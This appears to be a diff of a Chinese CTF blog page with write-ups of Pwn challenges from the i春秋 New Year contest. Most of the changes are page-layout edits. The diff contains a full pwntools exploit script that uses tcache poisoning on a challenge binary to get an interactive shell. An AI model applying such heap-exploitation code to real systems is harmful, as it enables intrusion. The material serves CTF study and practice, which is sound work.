@@ -125,21 +125,32 @@
     <section class="section">
         <div class="container">
             <div class="columns">
-                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">  
+
 <div class="card">
     
     <div class="card-content article ">
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <i class="fas fa-angle-double-right"></i>新春战役部分Pwn题解
+            
+        </h1>
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2020-02-25T02:24:02.967Z">2020-02-25</time>
+                <time class="level-item has-text-grey" datetime="2020-02-25T02:24:02.967Z"><i class="far fa-calendar-alt">&nbsp;</i>2020-02-25</time>
+                
+                <time class="level-item has-text-grey is-hidden-mobile" datetime="2020-02-25T02:24:03.087Z"><i class="far fa-calendar-check">&nbsp;</i>2020-02-25</time>
+                
                 
                 <div class="level-item">
+                <i class="far fa-folder-open has-text-grey"></i>&nbsp;
                 <a class="has-link-grey -link" href="/categories/Pwn/">Pwn</a>
                 </div>
                 
                 
                 <span class="level-item has-text-grey">
+                    <i class="far fa-clock"></i>&nbsp;
                     
                     
                     20 分钟 读完 (大约 2946 个字)
@@ -149,11 +160,6 @@
             </div>
         </div>
         
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                新春战役部分Pwn题解
-            
-        </h1>
         <div class="content">
             <p>i春秋举办的新春战役赛部分Pwn题解，当时只会做几道，太菜了</p>
 <a id="more"></a>
@@ -199,6 +205,16 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">file = <span class="string">'./pwn'</span></span><br><span class="line">e = ELF(file)</span><br><span class="line">libc = e.libc</span><br><span class="line">rlibc = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'26569'</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(code=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> debug</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    gdb.attach(p, code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(local)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> p, libc, debug</span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        p = process(file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(ip, port)</span><br><span class="line">        debug = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> rlibc != <span class="string">''</span>:</span><br><span class="line">            libc = ELF(rlibc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">rc = <span class="keyword">lambda</span>: p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">rn = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">shell = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">un64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">un32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">run(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"?"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, c)</span>:</span></span><br><span class="line">    sla(<span class="string">"?"</span>, <span class="string">"2"</span>)</span><br><span class="line">    sla(<span class="string">"?\n"</span>, str(idx))</span><br><span class="line">    se(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"?"</span>, <span class="string">"3"</span>)</span><br><span class="line">    sla(<span class="string">"?\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, p64(<span class="number">0x4040C0</span> - <span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"?"</span>, <span class="string">"6"</span>)</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>
 
         </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="Mask6asok.github.io/2020/02/25/gyctf_pwn.html">新春战役部分Pwn题解</a></li>
+            <li><strong>本文作者：</strong><a href="Mask6asok.github.io">Mask</a></li>
+            <li><strong>本文链接：</strong><a href="Mask6asok.github.io/2020/02/25/gyctf_pwn.html">Mask6asok.github.io/2020/02/25/gyctf_pwn.html</a></li>
+            <li><strong>发布时间：</strong>2020-02-25</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
         
         
         
